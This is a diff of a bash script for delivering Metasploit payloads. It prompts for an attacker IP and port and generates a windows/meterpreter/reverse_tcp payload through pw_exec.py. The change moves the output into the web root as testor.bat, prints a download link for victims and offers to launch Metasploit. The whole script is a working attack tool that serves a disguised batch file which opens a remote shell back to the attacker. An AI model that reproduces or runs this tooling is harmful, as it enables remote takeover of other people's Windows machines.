@@ -1,9 +1,9 @@
-#!/usr/bin/env bash
+#!/usr/bin/sh
 
-#FMfu
 
 
 pwned='pw_exec.py'
+
 
 echo " Your IP :"
 read ip;
@@ -13,20 +13,19 @@ read port;
 payload=windows/meterpreter/reverse_tcp
 
 python pw_exec.py $payload $ip $port > /dev/null 2>&1
-rm unicorn.rc
+rm -rf unicorn.rc
 
-echo "You want move fireworm.txt to /var/www/html/ and also want to start apache2 ( y or n) :"
+echo "You want move fireworm.txt to /var/www/html/testor.bat ( y or n) :"
 read start1;
 
 if [ $start1 = "y" ]; then
- mv fireworm.txt /var/www/html/
- service apache2 start
+ sudo mv fireworm.txt /var/www/html/testor.bat
+ echo "Download the file $ip/testor.bat"
 else
  echo "Enter the file name :"
  read filename;
  mv fireworm.txt $filename.bat
  echo "now your file is $filename.bat"
-
 fi
 
 echo "Do you want start metasploit ( y or n) :"
@@ -37,4 +36,3 @@ if [ $start = "y" ]; then
 else
  echo "Byee!!"
 fi
-            
